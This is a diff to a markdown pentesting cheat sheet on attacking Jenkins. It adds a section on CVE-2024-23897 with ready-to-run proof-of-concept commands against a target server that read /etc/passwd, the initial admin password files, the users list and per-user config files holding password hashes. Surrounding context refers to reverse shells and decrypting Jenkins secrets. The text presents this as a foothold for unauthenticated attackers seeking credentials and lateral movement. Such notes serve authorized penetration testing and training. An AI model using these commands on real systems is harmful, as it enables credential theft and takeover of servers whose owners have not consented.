@@ -56,8 +56,6 @@ cat /var/jenkins_home/users/<user_id>/config.xml | grep passwordHash
 
 
 
-
-
 --- 
 
 ## Reverse Shell from Jenkins
@@ -147,3 +145,98 @@ println( hudson.util.Secret.decrypt("
 ```
 
 ![](../../../Images/decrypt_jenkins_result.png)
+
+
+
+---
+
+
+## CVE-2024-23897 - Jenkins Arbitrary File Read (CLI)
+
+Jenkins before **2.442** (LTS before **2.426.3**) is vulnerable to an arbitrary file read through its CLI parser.
+
+The issue comes from how Jenkins interprets arguments starting with `@`, replacing them with file contents.
+
+This allows reading arbitrary files from the Jenkins controller.
+
+
+### When to Use It
+
+This vulnerability is especially useful when:
+
+- You find Jenkins exposed but have **no credentials**
+    
+- Jenkins is in the **Unlock Jenkins** stage
+    
+- You need to enumerate users
+    
+- You need credentials for lateral movement
+    
+- You want to recover secrets/tokens
+    
+- You want to escalate from Jenkins access to system access
+    
+
+Think of it as an **initial foothold enumeration primitive**.
+
+
+### Basic Usage
+
+Using the [PoC](https://github.com/godylockz/CVE-2024-23897):
+
+```bash
+python3 jenkins_fileread.py -u http://TARGET:8080 -f /etc/passwd
+```
+
+Authenticated mode:
+
+```bash
+python3 jenkins_fileread.py -u http://TARGET:8080 -f /etc/passwd --username admin --password admin
+```
+
+
+### Useful Scenarios
+
+#### 1. Jenkins Setup Wizard (Initial Password Disclosure)
+
+If you see:
+![](../../../Images/unlock_jenkins.png)
+
+Jenkins usually tells you where the initial admin password is stored.
+
+Typical paths:
+
+```bash
+/root/.jenkins/secrets/initialAdminPassword
+/var/lib/jenkins/secrets/initialAdminPassword
+/var/jenkins_home/secrets/initialAdminPassword
+```
+
+Read it:
+
+```bash
+python3 jenkins_fileread.py -u http://TARGET:8080 -f /root/.jenkins/secrets/initialAdminPassword
+```
+
+
+#### 2. User Enumeration
+
+If you need valid usernames:
+
+```bash
+python3 jenkins_fileread.py -u http://TARGET:8080 -f /var/jenkins_home/users/users.xml
+```
+
+#### 3. Password Hash Extraction
+
+Once users are known:
+
+```bash
+python3 jenkins_fileread.py -u http://TARGET:8080 -f /var/jenkins_home/users/<user>/config.xml
+```
+
+Look for:
+
+```xml
+<passwordHash>#jbcrypt:...</passwordHash>
+```
